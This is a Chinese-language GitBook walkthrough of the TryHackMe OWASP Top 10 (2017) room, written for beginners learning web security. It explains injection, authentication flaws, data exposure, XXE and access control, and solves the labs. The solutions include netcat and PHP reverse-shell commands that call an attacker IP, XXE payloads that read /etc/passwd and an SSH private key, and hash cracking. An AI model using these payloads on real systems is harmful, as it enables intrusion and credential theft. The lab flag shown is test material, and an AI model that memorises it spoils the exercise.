---
description: 本文相关内容：了解并利用每个OWASP Top 10漏洞，它们是十大最严重的Web安全风险。
cover: ../../.gitbook/assets/2857591-20230614182517669-642644077.png
coverY: 0
layout:
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# OWASP Top10(2017版)

TryHackMe实验房间链接：[https://tryhackme.com/room/owasptop10](https://tryhackme.com/room/owasptop10)



## 简介



本文知识点是为初学者而设计的，假设阅读本文的人员之前没有接触过任何安全相关知识。

本文所涉及的知识点如下(相关的知识点只是基础知识点，如果你想深入了解OWASP TOP 10或者进行web漏洞挖掘工作，那么你还需要进一步的学习和练习)：

* Injection（注入漏洞）
* Broken Authentication（存在缺陷的身份验证机制）
* Sensitive Data Exposure（敏感信息泄露）
* XML External Entity（XML外部实体注入-XXE漏洞）
* Broken Access Control（存在缺陷的访问控制机制）
* Security Misconfiguration（安全性配置错误）
* Cross-site Scripting（跨站脚本漏洞-XSS漏洞）
* **I**nsecure Deserialization（不安全的反序列化-反序列化漏洞）
* Components with Known Vulnerabilities（具有已知漏洞的组件）
* Insufficent Logging & Monitoring（日志记录和监控不足）

**本文使用的是OWASP TOP 10的2017年标准**。

![image-20221205235710045](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221205235710045.png)

> 关于OWASP-TOP10的介绍：https://www.safedog.cn/news/5092.html

## \[严重程度TOP1] 注入

注入漏洞在当今的应用中非常普遍，之所以出现这些漏洞 是因为web应用程序会将用户所控制的输入数据解释为实际的命令或参数；注入攻击取决于当前web应用程序正在使用的技术以及这些技术会如何准确解释用户所输入的数据，一些常见的例子包括:

* SQL注入:当用户控制的输入数据被传递给后端的SQL查询语句时，就会发生SQL注入；通过利用该漏洞，攻击者可以传入SQL查询语句来操纵针对目标数据库的查询行为并获取到相关查询结果。
* 命令注入:当用户的输入被传递成为系统命令时，就会发生命令注入；通过利用该漏洞，攻击者能够在web应用服务器上执行任意的系统命令。

如果攻击者能够成功地传递一些 会被web应用程序正确解释的输入数据，他们将能够做以下事情:

* 当用户输入能被传递到数据库查询时，攻击者可以访问、修改和删除数据库中的数据信息；这意味着攻击者可以窃取个人详细信息和用户凭证等敏感信息。
* 攻击者可以在目标服务器上执行任意系统命令，这将允许攻击者访问 服务器用户所对应的权限级别下 的系统文件；然后攻击者就能够窃取敏感数据，并能对与 执行恶意命令的服务器 相链接的基础设施进行更多攻击。

防止注入攻击的主要防御措施是确保用户所控制的输入数据不会被解释为查询语句或有效命令，有几种不同的方法:

* 使用允许列表(白名单)：当用户提供的输入被发送到服务器时，此输入将会与安全输入或字符列表进行比较。如果用户所提供的输入数据被标记为安全的，那么它将被允许通过；否则，用户所提供的输入数据将被拒绝通过，应用程序此时也将抛出一个错误提示。
* 过滤用户所输入的数据：如果用户所提供的输入中包含某些危险字符，那么应用程序会首先将这些危险字符清除，然后再继续进行处理。

危险字符或危险输入会被归类为任何可能改变基础数据处理方式的外部输入，除了手动构造允许列表或仅仅清除输入数据之外，还有各种函数库可以帮助你执行防注入操作。

## \[严重程度TOP1] 操作系统命令注入

当web应用程序中的服务器端代码(如PHP代码)在宿主机上进行系统调用时，就可能会发生命令注入，这是一个web漏洞，该漏洞将允许攻击者利用其所构造的系统调用在服务器上执行任意操作系统命令。

有时，命令注入并不总是恶意的，比如执行 _**whoami**_ 命令或者简单地执行 _**读取文件**_ 命令；但是命令注入漏洞能为攻击者提供很多选择以进行漏洞利用，攻击者所能做的最糟糕的事情是利用命令注入漏洞来产生一个反向shell，并获得web服务器运行时所对应的用户权限。

通过简单地执行payload `;nc -e /bin/bash`就可能获得目标web服务器的权限（注意：一些netcat命令的变体也可能不支持-e选项），你可以使用以下反向shell列表以及在线生成器作为替代方案：

> https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
>
> https://www.revshells.com/

一旦攻击者在web服务器上获得立足点，他们就可以开始对目标操作系统进行常见的枚举操作，并能够尝试寻找可用于提权或者内网横向移动的方法。

## \[严重程度TOP1] 命令注入-练习

**什么是主动命令注入？**

当向服务器发出的系统命令未在 HTML 文档中给攻击者返回响应消息时，发生的可能是盲注类型的命令注入；而在主动命令注入攻击中，攻击者将收到对应的响应消息，目标站点可以通过多个 HTML 元素使响应消息对攻击者可见。

让我们考虑一个场景：攻击者正在尝试建立基于 Web 的shell，但不小心将其暴露在 Internet 上，它还未完成，但如果目标网站存在命令注入漏洞，那么攻击者就可以利用该shell 并在目标网站的当前页面上看到来自系统调用的响应消息。

让我们看看 evilshell.php 中的示例代码，看看它在做什么，以及为什么它会激活命令注入。

_**EvilShell (evilshell.php) Code Example**_

![image-20221201174453578](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221201174453578.png)

查看伪代码，上面的代码片段会执行以下操作：

1. 检查是否设置了参数“_commandString_”。
2. 如果设置了，则变量 `$command_string` 将获取传递到用户输入字段中的内容。
3. 然后程序将进入 try 块以执行函数`passthru($command_string)`。 你可以阅读有关[passthru() 的文档](https://www.php.net/manual/en/function.passthru.php)，它会执行对应变量所传递的内容，然后将输出结果直接传递回浏览器中的网站相关页面。
4. 如果 try 执行不成功，那么 catch 应该将错误消息输出到当前页面，但是这通常不会显示任何东西，因为在此处无法直接输出stderr(标准错误输出)，添加catch是因为PHP不允许我们在没有使用 catch 的情况下单独执行 try 。

**检测主动命令注入的方法**

当你可以看到系统调用的响应消息时，就说明发生了主动命令注入。在上面的代码中，函数`passthru()`会将响应消息直接传递给HTML文档，因此你可以在相关网页中看到你的命令注入payload的执行效果；正是因为基于这一点，所以我们可以通过输入一些有用的命令来尝试进一步枚举目标信息。对 `passthru()` 的函数调用可能并不总是在屏幕后发生，以上示例只是一个用来演示命令注入漏洞的简单方法。

**可尝试执行的命令**

**Linux**

* whoami
* id
* ifconfig/ip addr
* uname -a
* ps -ef

**Windows**

* whoami
* ver
* ipconfig
* tasklist
* netstat -an

请导航至 http://MACHINE\_IP/evilshell.php ，以完成相关问题。

**答题**

![image-20221201191620410](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221201191620410.png)

tips：MOTD-每日提示-message of the day

启动目标机，在攻击机的浏览器中访问 http://10.10.163.228/evilshell.php

在攻击机上设置netcat监听器：

```shell
nc -lvnp 4444
```

![image-20221203184144289](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221203184144289.png)

在http://10.10.163.228/evilshell.php 页面使用反向shell命令：

```shell
php -r '$sock=fsockopen("10.14.32.186",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
#反向shell备忘录：https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
```

![image-20221203184256414](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221203184256414.png)

![image-20221203184333130](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221203184333130.png)

_**通过攻击机的反向shell界面执行命令**_

使用`ls`命令：

![image-20221203184423876](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221203184423876.png)

使用`cat /etc/passwd`命令（查看non-root/non-service/non-daemon用户数目）：

![image-20221203184654131](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221203184654131.png)

使用`whoami`命令（查看当前用户名）：

![image-20221203184721887](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221203184721887.png)

使用`cat /etc/passwd`命令（查看当前用户名所对应的shell设置）：

![image-20221203184953287](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221203184953287.png)

使用`cat /etc/os-release`命令（查看操作系统版本）：

![image-20221203185142815](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221203185142815.png)

使用`cat /etc/update-motd.d/00-header`命令查看MOTD（message of the day-每日提示）中的隐藏信息：

tips：`ls /etc/update-motd.d`

![image-20221203185553421](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221203185553421.png)

## \[严重程度TOP2] 损坏的身份验证

![image-20221203185812892](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221203185812892.png)

身份验证和会话(session)管理构成了现代 Web 应用程序的核心组件。身份验证允许用户通过验证其身份来访问 Web 应用程序，最常见的身份验证形式是使用用户名和密码机制。 用户需要输入密码凭据，然后服务器将验证它们是否正确，如果用户所提供的凭据是正确的，那么服务器将向用户的浏览器提供一个会话(session) cookie。之所以需要会话(session) cookie，是因为 Web 服务器将使用无状态的 HTTP(S)协议和客户端进行通信，通过附加会话 cookie 意味着服务器将知道是谁在发送什么数据，然后服务器就可以跟踪用户的操作。

如果攻击者能够发现身份验证机制中的缺陷，他们就可以成功访问其他用户所对应的帐户，这将允许攻击者能够访问某些敏感数据（取决于应用程序的目的）。身份验证机制中的一些常见缺陷包括：

* 暴力破解攻击：如果 Web 应用程序使用用户名和密码作为身份验证机制，攻击者可能会发起暴力破解攻击，该攻击将允许攻击者使用多次身份验证尝试来猜测用户名和密码，一旦破解成功攻击者就能非法通过身份验证机制。
* 使用弱凭证：Web 应用程序应设置强密码策略。 如果应用程序允许用户设置诸如“password1”或普通密码之类的弱验证凭据，那么攻击者就能够轻松猜解出这些凭据并实现对用户帐户的访问。
* 弱会话 Cookie：会话(Session) Cookie 是服务器跟踪用户操作的方式。 如果会话 cookie 包含的是一些可预测的值，那么攻击者就可以伪造会话 cookie 并实现对用户帐户的访问。

根据确切的身份验证机制缺陷，可以有多种针对损坏的身份验证机制的缓解措施：

* 为防御密码猜测类型的攻击，请确保web应用程序执行强密码策略。
* 为防御暴力破解攻击，请确保web应用程序在一定次数的失败的验证尝试后 强制执行自动锁定操作，这将防止攻击者发起更多的暴力破解攻击尝试。
* 实施多因素身份验证——如果用户有多种身份验证方法，例如，使用用户名和密码机制并要求用户在其移动设备上接收短信代码等，那么攻击者将很难同时获得两种凭据以访问目标用户的帐户。

## \[严重程度TOP2] 损坏的身份验证-练习

本小节将通过一个示例以研究身份验证机制中的逻辑缺陷。

当开发人员忘记清理用户在web应用程序代码中提供的输入（用户名和密码）时，可能会使目标web应用程序容易受到 SQL 注入等攻击。 但是，在此处我们将重点关注一个逻辑缺陷，即：关于现有用户的重新注册问题。

例子：假设有一个名为 admin 的现有用户，现在我们想要访问admin帐户，我们可以尝试对用户名稍作修改并重新注册用户名，进入用户名注册页面：我们在用户名字段中输入“ admin”（注意此用户名开头含有空格），然后接着输入其他必需信息（如电子邮件ID或密码等）并提交该数据，该操作会注册一个新用户，但该用户将拥有与普通管理员相同的权限。通过登录新用户就能够看到admin用户权限下的相关内容。

要查看实际效果，请访问 http://MACHINE\_IP:8888 并尝试注册一个名为 darren的用户，你会看到一个提示，告诉你该用户已经存在，我们继续尝试注册名为“ darren”的用户（注意此用户名开头含有空格），注册完成之后进行登录操作，我们就能看到 darren 帐户中的内容。

**答题**

![image-20221203195339601](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221203195339601.png)

启动目标机，访问目标站点： http://10.10.116.78:8888/

注册名为“ darren”的用户（注意此用户名开头含有空格），登录新用户并查看flag内容：

![image-20221203200121330](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221203200121330.png)

![image-20221203200241739](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221203200241739.png)

![image-20221203200307678](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221203200307678.png)

注册名为“ arthur”的用户（注意此用户名开头含有空格），登录新用户并查看flag内容：

![image-20221203200404832](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221203200404832.png)

![image-20221203200437726](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221203200437726.png)

![image-20221203200502403](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221203200502403.png)

## \[严重程度TOP3] 敏感信息泄露-介绍

当 web 应用程序意外泄露敏感数据时，我们将其称为“敏感数据泄露”，这些数据通常是与用户直接相关的数据（例如姓名、出生日期、财务信息等），但也可能是一些技术信息，例如用户名和密码。在更复杂的层面上，这通常涉及诸如“中间人攻击”之类的技术，攻击者将通过他们控制的设备强制用户连接，然后利用对任何传输数据的弱加密来获取对拦截信息的访问权限（如果数据首先经过了加密......）。当然，有些示例要简单得多，我们可以在 目标Web 应用程序中找到该类漏洞，而且无需任何高级网络知识即可利用这些漏洞。事实上，在某些情况下，敏感数据可以直接在web服务器相关的的网站页面上找到......

## \[严重程度TOP3] 敏感信息泄露-材料1

以一种可以同时从多个位置轻松访问的格式来存储大量数据的最常见方法是通过数据库。 这显然非常适合 Web 应用程序，因为可能会有许多用户在任意时间内与目标网站发生交互。 数据库引擎通常遵循结构化查询语言 (SQL-**S**tructured **Q**uery **L**anguage) 语法； 然而，一些替代方案（例如 NoSQL）也越来越受欢迎。

在生产环境中，通常会看到在专用服务器上设置数据库，如运行 MySQL 或 MariaDB 等数据库服务；但是，数据库也可以被存储为文件形式，这些文件形式的数据库被称为“平面文件(flat-file)”数据库，因为它们是作为单个文件而存储在计算机上的。 使用“平面文件(flat-file)”比设置完整的数据库服务器要容易得多，因此可能会在较小的 Web 应用程序中看到。

如前所述，平面文件数据库是作为文件存储在计算机磁盘上的，这对于 Web 应用程序来说不会造成其他问题，但是如果将平面文件数据库存储在网站的根目录下（即连接到网站用户所能够访问的文件之一），将会发生什么情况呢？ 这将导致我们可以直接下载它到我们的本地机器上，并且可以完全访问对应的平面文件数据库中的所有内容，进而造成了敏感数据泄露！

让我们简要介绍一些用于查询平面文件数据库的语法。

最常见（也是最简单）的平面文件数据库格式是 sqlite 数据库，可以在大多数编程语言环境下进行交互，并且有一个专门的客户端可以在命令行上查询数据信息，这个客户端叫做“sqlite3”，在 Kali 中将默认安装。

假设我们已经成功地下载了一个平面文件数据库：

![image-20221203223336491](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221203223336491.png)

我们可以看到在当前文件夹中有一个SQLite数据库文件。

要访问它，我们可以使用：`sqlite3 <database-name>`

![image-20221203223516357](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221203223516357.png)

然后我们可以接着查看数据库中的表，通过使用命令`.tables`：

![image-20221203223657467](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221203223657467.png)

此时我们可以转储该表中的所有数据，但在转储数据之前，我们还需要先查看表的相关信息，否则我们不一定知道表中每一列的具体含义。

首先使用`PRAGMA table_info(customers);`查看表信息，然后使用`SELECT * FROM customers;`转储该表中的信息：

![image-20221203224039023](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221203224039023.png)

我们从表信息中可以看出，此表一共有四列：`custID`、`custName`、`creditCard`和`password`。 你可能会注意到这与查询该表的结果相符。

取第一行：

> 0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99

我们能够得知数据信息 custID (0)、custName (Joy Paulson)、creditCard (4916 9012 2231 7905) 和密码哈希值 (5f4dcc3b5aa765d61d8327deb882cf99)。

在下一小节中，我们将着眼于破解这个哈希值。

## \[严重程度TOP3] 敏感信息泄露-材料2

在上一个小节中，我们了解了如何查询 SQLite 数据库中的敏感数据，并且找到了一些密码哈希值(每个用户都有一个)。 在本小节中，我们将简要介绍如何破解这些密码哈希值。

在哈希破解方面，Kali 预装了各种工具——如果你知道如何使用这些工具，请随意使用即可。

在本小节中我们将使用在线工具进行hash破解工作：[Crackstation](https://crackstation.net/)。Crackstation网站非常擅长破解弱密码的哈希值，而对于更复杂的哈希，我们则需要使用其他工具来进行破解； 例子中的所有可破解的密码哈希值都是弱密码的 MD5 哈希值，所以我们直接使用Crackstation在线破解即可。

当我们导航到Crackstation网站时，我们会看到以下界面：

![image-20221203225245851](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221203225245851.png)

粘贴我们在上一小节中找到的 Joy Paulson 的密码哈希值(`5f4dcc3b5aa765d61d8327deb882cf99`) ，勾选验证码，然后点击“破解哈希”按钮即可：

![image-20221203225511295](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221203225511295.png)

我们看到哈希值被成功破解，目标用户的密码是“password”！

注意：Crackstation 网站在破解hash时，将使用很大的字典，如果哈希值所对应的密码确实不在字典中，那么 Crackstation 将无法破解该哈希值。

## \[严重程度TOP3] 敏感信息泄露-练习

启动目标机器，回答知识点相关问题！

**答题**

![image-20221203230018507](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221203230018507.png)

启动目标机器，访问目标站点，查看login网页的页面源代码，可以看到作者留下的一些评论，告诉我们 /assets 中有一个数据库文件：

![image-20221204191557968](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221204191557968.png)

![image-20221204191855964](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221204191855964.png)

![image-20221204191939098](https://c/Users/Vimalano2ise/AppData/Roaming/Typora/typora-user-images/image-20221204191939098.png)

通过浏览器的url地址栏 导航到 /assets ，找到数据库文件（点击文件即可下载到攻击机上）：

![image-20221204192050796](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221204192050796.png)

通过浏览器下载数据库文件，然后在攻击机终端使用命令`ls`和`file webapp.db`（验证所下载的文件是否为数据库文件）：

![image-20221204192411223](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221204192411223.png)

使用命令`sqlitebrowser webapp.db`通过使用可视化客户端打开数据库文件，查看用户表中的敏感信息：

![image-20221204192733787](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221204192733787.png)

使用以下网站，进行在线hash破解操作：

> https://crackstation.net/
>
> https://hashes.com/en/decrypt/hash

![image-20221204192841587](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221204192841587.png)

使用刚才得到的明文密码信息以admin用户身份登录目标站点，查看flag内容：

![image-20221204193007000](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221204193007000.png)

![image-20221204193046169](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221204193046169.png)

> THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl} 。

## \[严重程度TOP4] XML 外部实体注入（XXE漏洞）

![image-20221204193850941](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221204193850941.png)

XML 外部实体 (XXE) 注入是一种滥用 XML 解析器/数据 功能的漏洞。它通常允许攻击者与应用程序本身可以访问的任何后端或外部系统进行交互，并且可以允许攻击者读取该系统上的文件，XXE还可以导致拒绝服务 (DoS-Denial of Service) 攻击，或者可以使用 XXE 执行服务器端请求伪造 (SSRF)，诱导 Web 应用程序向其他应用程序发出请求。 XXE甚至能够进行端口扫描以及导致远程代码执行。

XXE 攻击有两种类型：带内(in-band)和带外 (out-of-band)，带外的XXE可简写为OOB-XXE。

1.在带内 XXE 攻击中，攻击者可以立即收到web应用程序对 XXE payload的响应。

2.在带外 XXE 攻击（也可称为盲注类型的 XXE）中，Web 应用程序不会立即响应XXE payload，攻击者必须将XXE payload对应的响应输出反映到其他文件中或攻击者所控制的服务器上。

## \[严重程度TOP4] XXE漏洞-XML可扩展标记性语言

在我们继续学习如何利用XXE 漏洞之前，我们必须正确理解 XML 的概念。

**什么是XML？**

XML（eXtensible Markup Language-可扩展标记语言）是一种标记语言，它定义了一组规则，用于以人工可读和机器可读的格式对文档进行编码处理，XML是一种用于存储和传输数据的标记语言。

**为什么要使用XML？**

1.XML 是独立于平台和编程语言的，因此它可以在任何系统上使用，并能支持IT技术变更的情况。

2.使用 XML 存储和传输的数据可以在任何时间点更改，且不会影响数据表示。

3.XML 允许使用 DTD 和Schema(模式)进行内容验证，此验证可确保 XML 文档没有任何语法错误。

4.由于XML独立于平台的特性，它简化了各种系统之间的数据共享，因为XML数据在不同系统之间传输时 不需要进行任何转换处理。

**语法**

每个 XML 文档大多以 XML Prolog 开头：

`<?xml version="1.0" encoding="UTF-8"?>`

上面一行被称为 XML 序言(prolog )，它将指定 XML 版本和 XML 文档中所使用的编码类型，该行不是强制使用的，但将这一行放在所有 XML 文档的开头被认为是一种“良好做法”。

每个 XML 文档都必须包含一个“ROOT”元素，例如：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<mail>
   <to>falcon</to>
   <from>feast</from>
   <subject>About XXE</subject>
   <text>Teach about XXE</text>
</mail>
```

在上面的示例中，`<mail>` 是该文档的 ROOT 元素，`<to>`、`<from>`、`<subject>`、`<text>` 是子元素。 如果一个 XML 文档没有任何根元素，那么它将被认为是错误的或无效的 XML 文档。

另一件要记住的事情是 XML 是一种区分大小写的语言：如果标签以 `<to>` 开头，那么它必须以 `</to>` 结尾，而不能以 `</To>` （大写T ）结尾。

与 HTML 一样，我们也可以在 XML 中使用属性(attributes )，XML中关于属性的语法也与 HTML 非常相似，例如：

```xml
<text category = "message">You need to learn about XXE</text>
```

tips：category英文翻译为--类别

在上面的示例中，category 是属性名称，message 是属性值。

**答题**

![image-20221204223418751](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221204223418751.png)

## \[严重程度TOP4] XXE漏洞-DTD概念

在继续学习 XXE 之前，我们必须了解什么是XML中的 DTD 。

DTD 代表文档类型定义(Document Type Definition)，DTD将定义一个XML 文档的结构以及合法元素和属性(attributes )。

让我们试着借助一个例子来理解这一点，假设我们有一个名为 _**note.dtd**_ 的文件，其中包含以下内容：

```xml-dtd
<!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)> <!ELEMENT to (#PCDATA)> <!ELEMENT from (#PCDATA)> <!ELEMENT heading (#PCDATA)> <!ELEMENT body (#PCDATA)> ]>
```

现在我们可以使用这个 DTD 来验证一些 XML 文档的信息，并确保 XML 文件符合该 DTD 所描述的规则。 例如：下面给出了一个使用 _**note.dtd**_ 的 XML 文档

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
    <to>falcon</to>
    <from>feast</from>
    <heading>hacking</heading>
    <body>XXE attack</body>
</note>
```

现在让我们来了解 DTD 是如何验证 XML文档信息的，以下是`note.dtd`文件中的DTD术语的含义（下面的DTD术语和上面的XML文档示例内容存在对应关系）：

* `!DOCTYPE note` - 定义名为`note` 的XML文档根元素（根元素为note）
* `!ELEMENT note` - 定义根元素`note`必须包含子元素：“`to`, `from`, `heading`, `body`”
* `!ELEMENT to` - 将`to`元素定义为“#PCDATA”类型
* `!ELEMENT from` - 将 `from` 元素定义为“#PCDATA”类型
* `!ELEMENT heading` - 将`heading`元素定义为“#PCDATA”类型
* `!ELEMENT body` - 将`body`元素定义为“#PCDATA”类型

注意：#PCDATA 表示可解析的字符数据。

**答题**

![image-20221204235609263](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221204235609263.png)

> 在DTD文件中定义一个新实体：!ENTITY

## \[严重程度TOP4] XXE漏洞-XXE Payload

现在我们将查看一些 XXE payload并了解它们是如何工作的。

1.我们将看到的第一个有效载荷非常简单。 如果你掌握前面的知识点，那么你将很容易理解此有效载荷。

```xml
<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 <userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
 </userInfo>
```

正如我们在上例中所看到的，我们首先定义一个名为 `name` 的 `ENTITY` (实体)并为其分配一个值`feast`，并随后在示例代码中使用该`ENTITY`。

2.我们也可以使用以下XXE payload，通过定义一个`ENTITY`并让它使用`SYSTEM`关键字来从目标系统中读取一些文件信息。

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```

同样，在上例中我们定义了一个名为 `read` 的 `ENTITY`(实体)，但不同之处在于 我们将其值设置为“`SYSTEM`”并指定了文件路径。

如果我们使用这个 payload，那么在易受 XXE 攻击的目标网站页面上（通常）就会显示文件`/etc/passwd` 的内容。我们也可以使用这种有效载荷来尝试读取其他文件信息，但很多时候你可能会读取失败，这也许是因为你所读取的文件本身并不支持以XXE响应消息的方式被查看。

## \[严重程度TOP4] XXE漏洞利用

现在让我们使用前文所提到的有效载荷进行XXE漏洞利用。

1.让我们看看如果我们尝试使用payload来显示名称(name)，目标网站将如何响应。

![image-20221205111742729](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221205111742729.png)

tips：上图为BurpSuite使用界面。

在上图的左侧，我们可以看到一个burp请求：这将向目标站点发送 使用 URL 编码的payload(具体的payload内容见上一小节知识点)；在上图的右侧我们可以看到使用该payload之后，在目标站点的页面上能够成功显示名称(name)值`falcon feast`。

2.现在让我们尝试读取 `/etc/passwd`文件内容

![image-20221205112504755](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221205112504755.png)

能够成功读取(使用的payload同样经过了URL编码，具体的payload内容见上一小节知识点)。

**答题**

![image-20221205112734898](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221205112734898.png)

启动目标机器，访问目标站点，进行XXE漏洞利用：

![image-20221205190226634](https://c/Users/Vimalano2ise/AppData/Roaming/Typora/typora-user-images/image-20221205190226634.png)

在攻击框中使用XXE payload--用于显示name值（此处显示的是自己在XML中设定的某个name值）：

```xml
<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 <userInfo>
  <firstName>Hihihi</firstName>
  <lastName>&name;</lastName>
 </userInfo>
```

![image-20221205190347909](https://c/Users/Vimalano2ise/AppData/Roaming/Typora/typora-user-images/image-20221205190347909.png)

在攻击框中使用XXE payload--用于查看`/etc/passwd`文件内容，获取目标站点所对应系统的当前用户名：

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```

![image-20221205191515365](https://c/Users/Vimalano2ise/AppData/Roaming/Typora/typora-user-images/image-20221205191515365.png) ![image-20221205190725517](https://c/Users/Vimalano2ise/AppData/Roaming/Typora/typora-user-images/image-20221205190725517.png)

在Linux系统中，用户对应的SSH密钥的默认保存路径为\*\*\*/home/用户名/.ssh/id\_rsa\*\*\* ；此处的用户名为falcon，所以路径为`/home/falcon/.ssh/id_rsa`。

![image-20221205190035962](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221205190035962.png)

在攻击框中使用XXE payload--用于查看当前用户falcon的私钥内容：

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/falcon/.ssh/id_rsa'>]>                                                    
<root>&read;</root>
```

![image-20221205191357202](https://c/Users/Vimalano2ise/AppData/Roaming/Typora/typora-user-images/image-20221205191357202.png) ![image-20221205191242778](https://c/Users/Vimalano2ise/AppData/Roaming/Typora/typora-user-images/image-20221205191242778.png)

> falcon的私钥前18个字符：MIIEogIBAAKCAQEA7

## \[严重程度TOP5] 损坏的访问控制

![image-20221205112914400](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221205112914400.png)

目标网站的某些页面可能会受到保护，从而不允许常规访问者对相关页面进行访问，例如，只有网站的管理员(admin)用户才能被允许访问 用于管理其他用户的网站页面；如果目标网站的常规访问者能够访问他们无权查看的受保护页面，那么就代表目标站点的访问控制正处于损坏状态。

如果 网站的普通访问者能够访问受保护的页面，可能会导致以下情况：

* 能够查看目标站点的一些敏感信息。
* 能够访问目标站点上 未经授权的功能。

OWASP 列出了一些[展示访问控制漏洞的攻击场景](https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control.html)：

_**场景#1**_-在通过web应用程序访问帐户信息的 SQL 调用中注入未经验证的数据：

> pstmt.setString(1, request.getParameter("acct"));
>
> ResultSet results = pstmt.executeQuery( );

攻击者只需修改浏览器URL中的“acct”参数即可发送他们想要访问的任何帐号ID，如果该调用没有经过正确的验证处理，那么攻击者就可以访问任何用户的帐户信息，例：

> http://example.com/app/accountInfo?acct=notmyacct

